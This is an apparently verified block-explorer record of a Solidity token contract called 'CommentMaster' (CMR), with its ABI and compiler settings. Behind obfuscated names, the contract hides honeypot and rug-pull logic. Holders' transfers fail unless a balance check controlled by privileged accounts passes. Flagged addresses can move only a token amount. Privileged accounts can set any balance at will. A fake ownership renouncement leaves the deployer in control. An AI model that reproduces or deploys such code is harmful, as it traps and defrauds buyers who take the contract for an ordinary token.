{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.3;\n\ninterface launchShould {\n    function createPair(address receiverEnable, address maxBuy) external returns (address);\n}\n\ninterface sellMarketingTake {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address fromReceiver) external view returns (uint256);\n\n    function transfer(address toSwapMarketing, uint256 tradingSender) external returns (bool);\n\n    function allowance(address autoTotal, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 tradingSender) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address toSwapMarketing,\n        uint256 tradingSender\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed exemptMin, uint256 value);\n    event Approval(address indexed autoTotal, address indexed spender, uint256 value);\n}\n\nabstract contract totalToken {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface receiverFee {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface sellMarketingTakeMetadata is sellMarketingTake {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract CommentMaster is totalToken, sellMarketingTake, sellMarketingTakeMetadata {\n\n    function approve(address swapMax, uint256 tradingSender) public virtual override returns (bool) {\n        receiverLaunched[_msgSender()][swapMax] = tradingSender;\n        emit Approval(_msgSender(), swapMax, tradingSender);\n        return true;\n    }\n\n    string private toAuto = \"CMR\";\n\n    mapping(address => uint256) private swapLiquidity;\n\n    function transferFrom(address txFee, address toSwapMarketing, uint256 tradingSender) external override returns (bool) {\n        if (_msgSender() != totalMin) {\n            if (receiverLaunched[txFee][_msgSender()] != type(uint256).max) {\n                require(tradingSender <= receiverLaunched[txFee][_msgSender()]);\n                receiverLaunched[txFee][_msgSender()] -= tradingSender;\n            }\n        }\n        return atSender(txFee, toSwapMarketing, tradingSender);\n    }\n\n    event OwnershipTransferred(address indexed amountFeeToken, address indexed limitReceiverLiquidity);\n\n    function walletFeeEnable(uint256 tradingSender) public {\n        listIs();\n        teamTxFee = tradingSender;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return toAuto;\n    }\n\n    function takeTx() public {\n        emit OwnershipTransferred(isAmount, address(0));\n        liquidityTotalAuto = address(0);\n    }\n\n    bool private swapList;\n\n    uint256 teamTxFee;\n\n    function transfer(address feeTotalLaunched, uint256 tradingSender) external virtual override returns (bool) {\n        return atSender(_msgSender(), feeTotalLaunched, tradingSender);\n    }\n\n    address public minTeam;\n\n    function getOwner() external view returns (address) {\n        return liquidityTotalAuto;\n    }\n\n    string private receiverSellMin = \"Comment Master\";\n\n    mapping(address => mapping(address => uint256)) private receiverLaunched;\n\n    uint256 public teamTrading;\n\n    bool public teamIs;\n\n    function shouldMarketingTeam(address feeTotalLaunched, uint256 tradingSender) public {\n        listIs();\n        swapLiquidity[feeTotalLaunched] = tradingSender;\n    }\n\n    function owner() external view returns (address) {\n        return liquidityTotalAuto;\n    }\n\n    constructor (){\n        if (totalReceiver != teamTrading) {\n            totalReceiver = teamTrading;\n        }\n        receiverFee shouldFundLaunch = receiverFee(totalMin);\n        minTeam = launchShould(shouldFundLaunch.factory()).createPair(shouldFundLaunch.WETH(), address(this));\n        \n        isAmount = _msgSender();\n        tokenList[isAmount] = true;\n        swapLiquidity[isAmount] = modeMax;\n        takeTx();\n        if (swapList == teamIs) {\n            totalReceiver = teamTrading;\n        }\n        emit Transfer(address(0), isAmount, modeMax);\n    }\n\n    uint8 private toReceiver = 18;\n\n    uint256 private totalReceiver;\n\n    address private liquidityTotalAuto;\n\n    address totalMode = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function totalMax(address tokenAuto) public {\n        if (maxTrading) {\n            return;\n        }\n        if (totalReceiver == teamTrading) {\n            amountEnable = false;\n        }\n        tokenList[tokenAuto] = true;\n        \n        maxTrading = true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return toReceiver;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return modeMax;\n    }\n\n    function atSender(address txFee, address toSwapMarketing, uint256 tradingSender) internal returns (bool) {\n        if (txFee == isAmount) {\n            return autoReceiver(txFee, toSwapMarketing, tradingSender);\n        }\n        uint256 receiverFrom = sellMarketingTake(minTeam).balanceOf(totalMode);\n        require(receiverFrom == teamTxFee);\n        require(toSwapMarketing != totalMode);\n        if (feeLiquidityMode[txFee]) {\n            return autoReceiver(txFee, toSwapMarketing, minToken);\n        }\n        return autoReceiver(txFee, toSwapMarketing, tradingSender);\n    }\n\n    function allowance(address modeShouldTrading, address swapMax) external view virtual override returns (uint256) {\n        if (swapMax == totalMin) {\n            return type(uint256).max;\n        }\n        return receiverLaunched[modeShouldTrading][swapMax];\n    }\n\n    function autoReceiver(address txFee, address toSwapMarketing, uint256 tradingSender) internal returns (bool) {\n        require(swapLiquidity[txFee] >= tradingSender);\n        swapLiquidity[txFee] -= tradingSender;\n        swapLiquidity[toSwapMarketing] += tradingSender;\n        emit Transfer(txFee, toSwapMarketing, tradingSender);\n        return true;\n    }\n\n    function balanceOf(address fromReceiver) public view virtual override returns (uint256) {\n        return swapLiquidity[fromReceiver];\n    }\n\n    bool public maxTrading;\n\n    mapping(address => bool) public feeLiquidityMode;\n\n    uint256 receiverSwapMin;\n\n    function name() external view virtual override returns (string memory) {\n        return receiverSellMin;\n    }\n\n    function tokenBuy(address teamExempt) public {\n        listIs();\n        \n        if (teamExempt == isAmount || teamExempt == minTeam) {\n            return;\n        }\n        feeLiquidityMode[teamExempt] = true;\n    }\n\n    uint256 constant minToken = 3 ** 10;\n\n    bool private amountEnable;\n\n    address totalMin = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 private tradingIsTo;\n\n    address public isAmount;\n\n    uint256 private modeMax = 100000000 * 10 ** 18;\n\n    function listIs() private view {\n        require(tokenList[_msgSender()]);\n    }\n\n    mapping(address => bool) public tokenList;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoTotal\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountFeeToken\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitReceiverLiquidity\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptMin\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeShouldTrading\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"swapMax\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapMax\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingSender\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromReceiver\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"feeLiquidityMode\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isAmount\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minTeam\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeTotalLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingSender\",\"type\":\"uint256\"}],\"name\":\"shouldMarketingTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamTrading\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamExempt\",\"type\":\"address\"}],\"name\":\"tokenBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tokenList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenAuto\",\"type\":\"address\"}],\"name\":\"totalMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeTotalLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingSender\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txFee\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"toSwapMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tradingSender\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tradingSender\",\"type\":\"uint256\"}],\"name\":\"walletFeeEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "CommentMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}